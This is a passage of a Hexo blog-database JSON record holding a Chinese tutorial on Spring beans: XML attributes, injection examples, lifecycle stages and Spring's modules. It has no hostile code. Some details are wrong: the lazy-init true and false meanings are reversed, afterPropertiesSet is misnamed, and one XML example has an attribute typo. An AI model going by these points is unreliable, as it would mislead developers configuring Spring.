replaced-method\n\n可以在运行时调用新的方法替换现有的方法，还能动态的更新原有方法的逻辑\n\n- constructor-arg\n\n通过构造函数注入。<br\nindex：指定注入属性的顺序索引(在构造函数中的顺序)，从0开始<br>\ntype：指该属性所对应的类型<br>\nref：引用的依赖对象<br>\nvalue：当注入的不是依赖对象，而是基本数据类型时，就用value<br>\n```\n<bean id=\"userEntity\" class=\"com.bonc.apimanage.test.UserEntity\">\n      <!-- 通过构造器注入属性值 有参的需要有参的构造函数 -->\n      <constructor-arg index=\"0\" value=\"1\"></constructor-arg>  \n      <constructor-arg index=\"1\" value=\"xxl\"></constructor-arg>\n      <!-- 或这样  -->\n      <constructor-arg name=\"id\" value=\"1\"></constructor-arg>  \n      <constructor-arg nam=\"name\" value=\"xxl\"></constructor-arg>   \n</bean>\n\n<bean id=\"userService\" class=\"com.bonc.apimanage.test.UserService\">\n      <constructor-arg  ref=\"userEntity\"></constructor-arg>\n</bean>\n\n```\n\n- property\n\n通过setter对应的方法注入。<br>\n\n- qualifier\n\n明确指定bean的名称进行注入\n\n### 2.Bean的生命周期\nSpring 只帮我们管理单例模式 Bean 的完整生命周期，对于 prototype 的 bean ，Spring 在创建好交给使用者之后则不会再管理后续的生命周期。<br>\n\n\n![bean生命周期](https://pic3.zhimg.com/80/754a34e03cfaa40008de8e2b9c1b815c_hd.jpg)\n\n- 实例化\n\n对于BeanFactory容器，当客户向容器请求一个尚未初始化的bean时，或初始化bean的时候需要注入另一个尚未初始化的依赖时，容器就会调用createBean进行实例化。<br>\n对于ApplicationContext容器，当容器启动结束后，便实例化所有的bean。 容器通过获取BeanDefinition对象中的信息进行实例化。并且这一步仅仅是简单的实例化，并未进行依赖注入。<br>\n实例化对象被包装在BeanWrapper对象中，BeanWrapper提供了设置对象属性的接口，从而避免了使用反射机制设置属性。\n\n\n- 填充属性\n\nSpring将值和Bean的引用注入进Bean对应的属性中(依赖注入).\n\n- Aware相关\n\n\n\nSpring中 特定的Aware接口，提供了对IOC容器的操作.<br>\n\n- BeanPostProcessor前置处理(postProcessorBeforeInitializion)\n\n- InitiallizionBean 中 afterProjectSet方法\n\n- 自定义的init-method\n\n- BeanPostProcessor的后置处理(postProcessorAfterInitializion)\n\n- Bean就绪\n\n- DisposableBean的destory方法\n\n- 自定义的destory-method\n\n### 3.Spring的七个模块\n\n- 1.Spring Core\n\nCore模块是Spring的核心类库，Spring的所有功能都依赖于该类库，Core主要实现IOC功能，Sprign的所有功能都是借助IOC实现的\n\n- 2.Spring Aop\n\nAOP模块是Spring的AOP库，提供了AOP（拦截器）机制，并提供常用的拦截器，供用户自定义和配置\n\n- 3.Spring ORM\n\n- 4.Spring DAO\n\n- 5.Spring Web\n\n- 6.Spring context\n\nSpring上下文是spring的配置文件，向Spring框架提供上下文信息,可以用来管理bean.\n\n- 7.Spring WebMVC\n\nWEB MVC模块为Spring提供了一套轻量级的MVC实现，在Spring的开发中，我们既可以用Struts也可以用Spring自己的MVC框架，相对于Struts，Spring自己的MVC框架更加简洁和方便  \n","source":"_posts/java/spring/spring基础1.md","raw":"---\ntitle: spring基础一 bean\ndate: 2019-06-23 00:58:44\ntags: [java,spring]\n---\n\n\n### 1.Bean的属性\nbean的 .xml 文件<br>\n```\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:schemaLocation=\"\nhttp://www.springframework.org/schema/beans\nhttp://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n<!-- 自己的bean -->\n<bean></bean>\n\n</beans>\n```\n将bean交给spring:\n```\n@ImportResource(locations = {\"classpath:xxxx.xml\"})\n```\n###### (1).自身属性\n\n\n- id\n\nid为bean的唯一标识名，也就是beanName.\n```\n<bean id=\"userEntity\" class=\"com.bonc.apimanage.test.UserEntity\">\n      <!-- 通过setter注入属性值 -->\n       <property name=\"id\" value=\"123\"></property>\n</bean>\n\n<bean id=\"userService\" class=\"com.bonc.apimanage.test.UserService\">\n    <!-- 注入 userEntity 属性对象 -->\n    <property name=\"userService\" ref=\"userEntity\"></property>\n</bean>\n```\n\n- name\n\nbean的别名。\n\n- class\n\nbean的类。子类bean不用定义该属性。\n\n- parent\n\n子类Bean定义它所引用它的父类Bean。这时class属性失效。子类Bean会继承父类Bean的所有属性，子类Bean也可以覆盖父类Bean的属性。注意：子类Bean和父类Bean是同一个Java类\n\n- abstract\n\n默认为”false”，用来定义Bean是否为抽象Bean。它表示这个Bean将不会被实例化，一般用于父类Bean，因为父类Bean主要是供子类Bean继承使用。\n\n- scope\n\n默认为singleton（单例）<br>\n\nprototype（原型）状态，BeanFactory将为每次Bean请求创建一个新的Bean实例。<br>\nsession：创建对象把创建的对象放到session域里面去<br>\nrequest：创建对象把创建的对象放到request域里面去<br>\nglobalsession：创建对象把创建的对象放到globalsession域里面去<br>\n\n- lazy-init\n\n用来定义这个Bean是否实现懒初始化<br>\n默认为 default  <br>\n如果为 true ，它将在BeanFactory启动时初始化所有的SingletonBean<br>\n如果为 false ,它只在Bean请求时才开始创建SingletonBean。\n\n- autowire\n\n它定义了Bean的自动装载方式<br>\nno :不使用自动装配功能<br>\nbyName :通过Bean的属性名实现自动装配<br>\nbyType :通过Bean的类型实现自动装配<br>\nconstructor :类似于byType，但它是用于构造函数的参数的自动组装<br>\ndefault：默认值，自动装配\n\n\n- depends-on\n\nBean在初始化时依赖的对象，这个对象会在这个Bean初始化之前创建<br>\n可以用来控制bean初始化顺序\n\n- init-method\n\n用来定义Bean的初始化方法，它会在Bean组装之后调用。它必须是一个无参数的方法\n\n- destory-method\n\n用来定义Bean的销毁方法，它在 BeanFactory 关闭时调用。同样，它也必须是一个无参数的方法。它只能应用于 singletonBean。\n\n- factory-method\n\n定义创建该Bean对象的工厂方法。它用于下面的 factory-bean ，表示这个Bean是通过工厂方法创建。此时， class 属性失效\n\n- factory-bean\n\n定义创建该 Bean 对象的工厂类。如果使用了 factory-bean 则 class 属性失效\n\n###### (2).子属性\n\n- meta\n\n元数据。当需要使用里面的信息时可以通过key获取<br>\nmeta 所声明的 key 并不会在 Bean 中体现，只是一个额外的声明，当我们需要使用里面的信息时，通过 BeanDefinition 的 getAttribute() 获取<br>\n\n- lookup-method\n\n获取器注入，是把一个方法声明为返回某种类型的 bean 但实际要返回的 bean 是在配置文件里面配置的。该方法可以用于设计一些可插拔的功能上，解除程序依赖\n\n- replaced-method\n\n可以在运行时调用新的方法替换现有的方法，还能动态的更新原有方法的逻辑\n\n- constructor-arg\n\n通过构造函数注入。<br\nindex：指定注入属性的顺序索引(在构造函数中的顺序)，从0开始<br>\ntype：指该属性所对应的类型<br>\nref：引用的依赖对象<br>\nvalue：当注入的不是依赖对象，而是基本数据类型时，就用value<br>\n```\n<bean id=\"userEntity\" class=\"com.bonc.apimanage.test.UserEntity\">\n      <!-- 通过构造器注入属性值 有参的需要有参的构造函数 -->\n      <constructor-arg index=\"0\" value=\"1\"></constructor-arg>  \n      <constructor-arg index=\"1\" value=\"xxl\"></constructor-arg>\n      <!-- 或这样  -->\n      <constructor-arg name=\"id\" value=\"1\"></constructor-arg>  \n      <constructor-arg nam=\"name\" value=\"xxl\"></constructor-arg>   \n</bean>\n\n<bean id=\"userService\" class=\"com.bonc.apimanage.test.UserService\">\n      <constructor-arg  ref=\"userEntity\"></constructor-arg>\n</bean>\n\n```\n\n- property\n\n通过setter对应的方法注入。<br>\n\n- qualifier\n\n明确指定bean的名称进行注入\n\n### 2.Bean的生命周期\nSpring 只帮我们管理单例模式 Bean 的完整生命周期，对于 prototype 的 bean ，Spring 在创建好交给使用者之后则不会再管理后续的生命周期。<br>\n\n\n![bean生命周期](https://pic3.zhimg.com/80/754a34e03cfaa40008de8e2b9c1b815c_hd.jpg)\n\n- 实例化\n\n对于BeanFactory容器，当客户向容器请求一个尚未初始化的bean时，或初始化bean的时候需要注入另一个尚未初始化的依赖时，容器就会调用createBean进行实例化。<br>\n对于ApplicationContext容器，当容器启动结束后，便实例化所有的bean。 容器通过获取BeanDefinition对象中的信息进行实例化。并且这一步仅仅是简单的实例化，并未进行依赖注入。<br>\n实例化对象被包装在BeanWrapper对象中，BeanWrapper提供了设置对象属性的接口，从而避免了使用反射机制设置属性。\n\n\n- 填充属性\n\nSpring将值和Bean的引用注入进Bean对应的属性中(依赖注入).\n\n- Aware相关\n\n\n\nSpring中 特定的Aware接口，提供了对IOC容器的操作.<br>\n\n- BeanPostProcessor前置处理(postProcessorBeforeInitializion)\n\n- InitiallizionBean 中 afterProjectSet方法\n\n- 自定义的init-method\n\n- BeanPostProcessor的后置处理(postProcessorAfterInitializion)\n\n- Bean就绪\n\n- DisposableBean的destory方法\n\n- 自定义的destory-method\n\n### 3.Spring的七个模块\n\n- 1.Spring Core\n\nCore模块是Spring的核心类库，Spring的所有功能都依赖于该类库，Core主要实现IOC功能，Sprign的所有功能都是借助IOC实现的\n\n- 2.Spring Aop\n\nAOP模块是Spring的AOP库，提供了AOP（拦截器）机制，并提供常用的拦截器，供用户自定义和配置\n\n- 3.Spring ORM\n\n- 4.Spring DAO\n\n- 5.Spring Web\n\n- 6.Spring context\n\nSpring上下文是spring的配置文件，向Spring框架提供上下文信息,可以用来管理bean.\n\n- 7.Spring WebMVC\n\nWEB MVC模块为Spring提供了一套轻量级的MVC实现，在Spring的开发中，我们既可以用Struts也可以用Spring自己的MVC框架，相对于Struts，Spring自己的MVC框架更加简洁和方便  \n","slug":"java/spring/spring基础1","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ln004k6dcpz0yejgsp","content":"<h3 id=\"1-Bean的属性\"><a href=\"#1-Bean的属性\" class=\"headerlink\" title=\"1.Bean的属性\"></a>1.Bean的属性</h3><p>bean的 .xml 文件<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class=\"line\">xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">xsi:schemaLocation=&quot;</span><br><span class=\"line\">http://www.springframework.org/schema/beans</span><br><span class=\"line\">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 自己的bean --&gt;</span><br><span class=\"line\">&lt;bean&gt;&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></p>\n<p>将bean交给spring:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ImportResource(locations = &#123;&quot;classpath:xxxx.xml&quot;&#125;)</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-自身属性\"><a href=\"#1-自身属性\" class=\"headerlink\" title=\"(1).自身属性\"></a>(1).自身属性</h6><ul>\n<li>id</li>\n</ul>\n<p>id为bean的唯一标识名，也就是beanName.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;userEntity&quot; class=&quot;com.bonc.apimanage.test.UserEntity&quot;&gt;</span><br><span class=\"line\">      &lt;!-- 通过setter注入属性值 --&gt;</span><br><span class=\"line\">       &lt;property name=&quot;id&quot; value=&quot;123&quot;&gt;&lt;/property&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;bean id=&quot;userService&quot; class=&quot;com.bonc.apimanage.test.UserService&quot;&gt;</span><br><span class=\"line\">    &lt;!-- 注入 userEntity 属性对象 --&gt;</span><br><span class=\"line\">    &lt;property name=&quot;userService&quot; ref=&quot;userEntity&quot;&gt;&lt;/property&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>name</li>\n</ul>\n<p>bean的别名。</p>\n<ul>\n<li>class</li>\n</ul>\n<p>bean的类。子类bean不用定义该属性。</p>\n<ul>\n<li>parent</li>\n</ul>\n<p>子类Bean定义它所引用它的父类Bean。这时class属性失效。子类Bean会继承父类Bean的所有属性，子类Bean也可以覆盖父类Bean的属性。注意：子类Bean和父类Bean是同一个Java类</p>\n<ul>\n<li>abstract</li>\n</ul>\n<p>默认为”false”，用来定义Bean是否为抽象Bean。它表示这个Bean将不会被实例化，一般用于父类Bean，因为父类Bean主要是供子类Bean继承使用。</p>\n<ul>\n<li>scope</li>\n</ul>\n<p>默认为singleton（单例）<br></p>\n<p>prototype（原型）状态，BeanFactory将为每次Bean请求创建一个新的Bean实例。<br><br>session：创建对象把创建的对象放到session域里面去<br><br>request：创建对象把创建的对象放到request域里面去<br><br>globalsession：创建对象把创建的对象放到globalsession域里面去<br></p>\n<ul>\n<li>lazy-init</li>\n</ul>\n<p>用来定义这个Bean是否实现懒初始化<br><br>默认为 default  <br><br>如果为 true ，它将在BeanFactory启动时初始化所有的SingletonBean<br><br>如果为 false ,它只在Bean请求时才开始创建SingletonBean。</p>\n<ul>\n<li>autowire</li>\n</ul>\n<p>它定义了Bean的自动装载方式<br><br>no :不使用自动装配功能<br><br>byName :通过Bean的属性名实现自动装配<br><br>byType :通过Bean的类型实现自动装配<br><br>constructor :类似于byType，但它是用于构造函数的参数的自动组装<br><br>default：默认值，自动装配</p>\n<ul>\n<li>depends-on</li>\n</ul>\n<p>Bean在初始化时依赖的对象，这个对象会在这个Bean初始化之前创建<br><br>可以用来控制bean初始化顺序</p>\n<ul>\n<li>init-method</li>\n</ul>\n<p>用来定义Bean的初始化方法，它会在Bean组装之后调用。它必须是一个无参数的方法</p>\n<ul>\n<li>destory-method</li>\n</ul>\n<p>用来定义Bean的销毁方法，它在 BeanFactory 关闭时调用。同样，它也必须是一个无参数的方法。它只能应用于 singletonBean。</p>\n<ul>\n<li>factory-method</li>\n</ul>\n<p>定义创建该Bean对象的工厂方法。它用于下面的 factory-bean ，表示这个Bean是通过工厂方法创建。此时， class 属性失效</p>\n<ul>\n<li>factory-bean</li>\n</ul>\n<p>定义创建该 Bean 对象的工厂类。如果使用了 factory-bean 则 class 属性失效</p>\n<h6 id=\"2-子属性\"><a href=\"#2-子属性\" class=\"headerlink\" title=\"(2).子属性\"></a>(2).子属性</h6><ul>\n<li>meta</li>\n</ul>\n<p>元数据。当需要使用里面的信息时可以通过key获取<br><br>meta 所声明的 key 并不会在 Bean 中体现，只是一个额外的声明，当我们需要使用里面的信息时，通过 BeanDefinition 的 getAttribute() 获取<br></p>\n<ul>\n<li>lookup-method</li>\n</ul>\n<p>获取器注入，是把一个方法声明为返回某种类型的 bean 但实际要返回的 bean 是在配置文件里面配置的。该方法可以用于设计一些可插拔的功能上，解除程序依赖</p>\n<ul>\n<li>replaced-method</li>\n</ul>\n<p>可以在运行时调用新的方法替换现有的方法，还能动态的更新原有方法的逻辑</p>\n<ul>\n<li>constructor-arg</li>\n</ul>\n<p>通过构造函数注入。&lt;br<br>index：指定注入属性的顺序索引(在构造函数中的顺序)，从0开始<br><br>type：指该属性所对应的类型<br><br>ref：引用的依赖对象<br><br>value：当注入的不是依赖对象，而是基本数据类型时，就用value<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;userEntity&quot; class=&quot;com.bonc.apimanage.test.UserEntity&quot;&gt;</span><br><span class=\"line\">      &lt;!-- 通过构造器注入属性值 有参的需要有参的构造函数 --&gt;</span><br><span class=\"line\">      &lt;constructor-arg index=&quot;0&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;  </span><br><span class=\"line\">      &lt;constructor-arg index=&quot;1&quot; value=&quot;xxl&quot;&gt;&lt;/constructor-arg&gt;</span><br><span class=\"line\">      &lt;!-- 或这样  --&gt;</span><br><span class=\"line\">      &lt;constructor-arg name=&quot;id&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;  </span><br><span class=\"line\">      &lt;constructor-arg nam=&quot;name&quot; value=&quot;xxl&quot;&gt;&lt;/constructor-arg&gt;   </span><br><span class=\"line\">&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;bean id=&quot;userService&quot; class=&quot;com.bonc.apimanage.test.UserService&quot;&gt;</span><br><span class=\"line\">      &lt;constructor-arg  ref=&quot;userEntity&quot;&gt;&lt;/constructor-arg&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>property</li>\n</ul>\n<p>通过setter对应的方法注入。<br></p>\n<ul>\n<li>qualifier</li>\n</ul>\n<p>明确指定bean的名称进行注入</p>\n<h3 id=\"2-Bean的生命周期\"><a href=\"#2-Bean的生命周期\" class=\"headerlink\" title=\"2.Bean的生命周期\"></a>2.Bean的生命周期</h3><p>Spring 只帮我们管理单例模式 Bean 的完整生命周期，对于 prototype 的 bean ，Spring 在创建好交给使用者之后则不会再管理后续的生命周期。<br></p>\n<p><img src=\"https://pic3.zhimg.com/80/754a34e03cfaa40008de8e2b9c1b815c_hd.jpg\" alt=\"bean生命周期\"></p>\n<ul>\n<li>实例化</li>\n</ul>\n<p>对于BeanFactory容器，当客户向容器请求一个尚未初始化的bean时，或初始化bean的时候需要注入另一个尚未初始化的依赖时，容器就会调用createBean进行实例化。<br><br>对于ApplicationContext容器，当容器启动结束后，便实例化所有的bean。 容器通过获取BeanDefinition对象中的信息进行实例化。并且这一步仅仅是简单的实例化，并未进行依赖注入。<br><br>实例化对象被包装在BeanWrapper对象中，BeanWrapper提供了设置对象属性的接口，从而避免了使用反射机制设置属性。</p>\n<ul>\n<li>填充属性</li>\n</ul>\n<p>Spring将值和Bean的引用注入进Bean对应的属性中(依赖注入).</p>\n<ul>\n<li>Aware相关</li>\n</ul>\n<p>Spring中 特定的Aware接口，提供了对IOC容器的操作.<br></p>\n<ul>\n<li><p>BeanPostProcessor前置处理(postProcessorBeforeInitializion)</p>\n</li>\n<li><p>InitiallizionBean 中 afterProjectSet方法</p>\n</li>\n<li><p>自定义的init-method</p>\n</li>\n<li><p>BeanPostProcessor的后置处理(postProcessorAfterInitializion)</p>\n</li>\n<li><p>Bean就绪</p>\n</li>\n<li><p>DisposableBean的destory方法</p>\n</li>\n<li><p>自定义的destory-method</p>\n</li>\n</ul>\n<h3 id=\"3-Spring的七个模块\"><a href=\"#3-Spring的七个模块\" class=\"headerlink\" title=\"3.Spring的七个模块\"></a>3.Spring的七个模块</h3><ul>\n<li>1.Spring Core</li>\n</ul>\n<p>Core模块是Spring的核心类库，Spring的所有功能都依赖于该类库，Core主要实现IOC功能，Sprign的所有功能都是借助IOC实现的</p>\n<ul>\n<li>2.Spring Aop</li>\n</ul>\n<p>AOP模块是Spring的AOP库，提供了AOP（拦截器）机制，并提供常用的拦截器，供用户自定义和配置</p>\n<ul>\n<li><p>3.Spring ORM</p>\n</li>\n<li><p>4.Spring DAO</p>\n</li>\n<li><p>5.Spring Web</p>\n</li>\n<li><p>6.Spring context</p>\n</li>\n</ul>\n<p>Spring上下文是spring的配置文件，向Spring框架提供上下文信息,可以用来管理bean.</p>\n<ul>\n<li>7.Spring WebMVC</li>\n</ul>\n<p>WEB MVC模块为Spring提供了一套轻量级的MVC实现，在Spring的开发中，我们既可以用Struts也可以用Spring自己的MVC框架，相对于Struts，Spring自己的MVC框架更加简洁和方便  </p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-Bean的属性\"><a href=\"#1-Bean的属性\" class=\"headerlink\" title=\"1.Bean的属性\"></a>1.Bean的属性</h3><p>bean的 .xml 文件<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class=\"line\">xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">xsi:schemaLocation=&quot;</span><br><span class=\"line\">http://www.springframework.org/schema/beans</span><br><span class=\"line\">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 自己的bean --&gt;</span><br><span class=\"line\">&lt;bean&gt;&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></p>\n<p>将bean交给spring:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ImportResource(locations = &#123;&quot;classpath:xxxx.xml&quot;&#125;)</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-自身属性\"><a href=\"#1-自身属性\" class=\"headerlink\" title=\"(1).自身属性\"></a>(1).自身属性</h6><ul>\n<li>id</li>\n</ul>\n<p>id为bean的唯一标识名，也就是beanName.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;userEntity&quot; class=&quot;com.bonc.apimanage.test.UserEntity&quot;&gt;</span><br><span class=\"line\">      &lt;!-- 通过setter注入属性值 --&gt;</span><br><span class=\"line\">       &lt;property name=&quot;id&quot; value=&quot;123&quot;&gt;&lt;/property&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;bean id=&quot;userService&quot; class=&quot;com.bonc.apimanage.test.UserService&quot;&gt;</span><br><span class=\"line\">    &lt;!-- 注入 userEntity 属性对象 --&gt;</span><br><span class=\"line\">    &lt;property name=&quot;userService&quot; ref=&quot;userEntity&quot;&gt;&lt;/property&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>name</li>\n</ul>\n<p>bean的别名。</p>\n<ul>\n<li>class</li>\n</ul>\n<p>bean的类。子类bean不用定义该属性。</p>\n<ul>\n<li>parent</li>\n</ul>\n<p>子类Bean定义它所引用它的父类Bean。这时class属性失效。子类Bean会继承父类Bean的所有属性，子类Bean也可以覆盖父类Bean的属性。注意：子类Bean和父类Bean是同一个Java类</p>\n<ul>\n<li>abstract</li>\n</ul>\n<p>默认为”false”，用来定义Bean是否为抽象Bean。它表示这个Bean将不会被实例化，一般用于父类Bean，因为父类Bean主要是供子类Bean继承使用。</p>\n<ul>\n<li>scope</li>\n</ul>\n<p>默认为singleton（单例）<br></p>\n<p>prototype（原型）状态，BeanFactory将为每次Bean请求创建一个新的Bean实例。<br><br>session：创建对象把创建的对象放到session域里面去<br><br>request：创建对象把创建的对象放到request域里面去<br><br>globalsession：创建对象把创建的对象放到globalsession域里面去<br></p>\n<ul>\n<li>lazy-init</li>\n</ul>\n<p>用来定义这个Bean是否实现懒初始化<br><br>默认为 default  <br><br>如果为 true ，它将在BeanFactory启动时初始化所有的SingletonBean<br><br>如果为 false ,它只在Bean请求时才开始创建SingletonBean。</p>\n<ul>\n<li>autowire</li>\n</ul>\n<p>它定义了Bean的自动装载方式<br><br>no :不使用自动装配功能<br><br>byName :通过Bean的属性名实现自动装配<br><br>byType :通过Bean的类型实现自动装配<br><br>constructor :类似于byType，但它是用于构造函数的参数的自动组装<br><br>default：默认值，自动装配</p>\n<ul>\n<li>depends-on</li>\n</ul>\n<p>Bean在初始化时依赖的对象，这个对象会在这个Bean初始化之前创建<br><br>可以用来控制bean初始化顺序</p>\n<ul>\n<li>init-method</li>\n</ul>\n<p>用来定义Bean的初始化方法，它会在Bean组装之后调用。它必须是一个无参数的方法</p>\n<ul>\n<li>destory-method</li>\n</ul>\n<p>用来定义Bean的销毁方法，它在 BeanFactory 关闭时调用。同样，它也必须是一个无参数的方法。它只能应用于 singletonBean。</p>\n<ul>\n<li>factory-method</li>\n</ul>\n<p>定义创建该Bean对象的工厂方法。它用于下面的 factory-bean ，表示这个Bean是通过工厂方法创建。此时， class 属性失效</p>\n<ul>\n<li>factory-bean</li>\n</ul>\n<p>定义创建该 Bean 对象的工厂类。如果使用了 factory-bean 则 class 属性失效</p>\n<h6 id=\"2-子属性\"><a href=\"#2-子属性\" class=\"headerlink\" title=\"(2).子属性\"></a>(2).子属性</h6><ul>\n<li>meta</li>\n</ul>\n<p>元数据。当需要使用里面的信息时可以通过key获取<br><br>meta 所声明的 key 并不会在 Bean 中体现，只是一个额外的声明，当我们需要使用里面的信息时，通过 BeanDefinition 的 getAttribute() 获取<br></p>\n<ul>\n<li>lookup-method</li>\n</ul>\n<p>获取器注入，是把一个方法声明为返回某种类型的 bean 但实际要返回的 bean 是在配置文件里面配置的。该方法可以用于设计一些可插拔的功能上，解除程序依赖</p>\n<ul>\n<li>replaced-method</li>\n</ul>\n<p>可以在运行时调用新的方法替换现有的方法，还能动态的更新原有方法的逻辑</p>\n<ul>\n<li>constructor-arg</li>\n</ul>\n<p>通过构造函数注入。&lt;br<br>index：指定注入属性的顺序索引(在构造函数中的顺序)，从0开始<br><br>type：指该属性所对应的类型<br><br>ref：引用的依赖对象<br><br>value：当注入的不是依赖对象，而是基本数据类型时，就用value<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;userEntity&quot; class=&quot;com.bonc.apimanage.test.UserEntity&quot;&gt;</span><br><span class=\"line\">      &lt;!-- 通过构造器注入属性值 有参的需要有参的构造函数 --&gt;</span><br><span class=\"line\">      &lt;constructor-arg index=&quot;0&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;  </span><br><span class=\"line\">      &lt;constructor-arg index=&quot;1&quot; value=&quot;xxl&quot;&gt;&lt;/constructor-arg&gt;</span><br><span class=\"line\">      &lt;!-- 或这样  --&gt;</span><br><span class=\"line\">      &lt;constructor-arg name=&quot;id&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;  </span><br><span class=\"line\">      &lt;constructor-arg nam=&quot;name&quot; value=&quot;xxl&quot;&gt;&lt;/constructor-arg&gt;   </span><br><span class=\"line\">&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;bean id=&quot;userService&quot; class=&quot;com.bonc.apimanage.test.UserService&quot;&gt;</span><br><span class=\"line\">      &lt;constructor-arg  ref=&quot;userEntity&quot;&gt;&lt;/constructor-arg&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>property</li>\n</ul>\n<p>通过setter对应的方法注入。<br></p>\n<ul>\n<li>qualifier</li>\n</ul>\n<p>明确指定bean的名称进行注入</p>\n<h3 id=\"2-Bean的生命周期\"><a href=\"#2-Bean的生命周期\" class=\"headerlink\" title=\"2.Bean的生命周期\"></a>2.Bean的生命周期</h3><p>Spring 只帮我们管理单例模式 Bean 的完整生命周期，对于 prototype 的 bean ，Spring 在创建好交给使用者之后则不会再管理后续的生命周期。<br></p>\n<p><img src=\"https://pic3.zhimg.com/80/754a34e03cfaa40008de8e2b9c1b815c_hd.jpg\" alt=\"bean生命周期\"></p>\n<ul>\n<li>实例化</li>\n</ul>\n<p>对于BeanFactory容器，当客户向容器请求一个尚未初始化的bean时，或初始化bean的时候需要注入另一个尚未初始化的依赖时，容器就会调用createBean进行实例化。<br><br>对于ApplicationContext容器，当容器启动结束后，便实例化所有的bean。 容器通过获取BeanDefinition对象中的信息进行实例化。并且这一步仅仅是简单的实例化，并未进行依赖注入。<br><br>实例化对象被包装在BeanWrapper对象中，BeanWrapper提供了设置对象属性的接口，从而避免了使用反射机制设置属性。</p>\n<ul>\n<li>填充属性</li>\n</ul>\n<p>Spring将值和Bean的引用注入进Bean对应的属性中(依赖注入).</p>\n<ul>\n<li>Aware相关</li>\n</ul>\n<p>Spring中 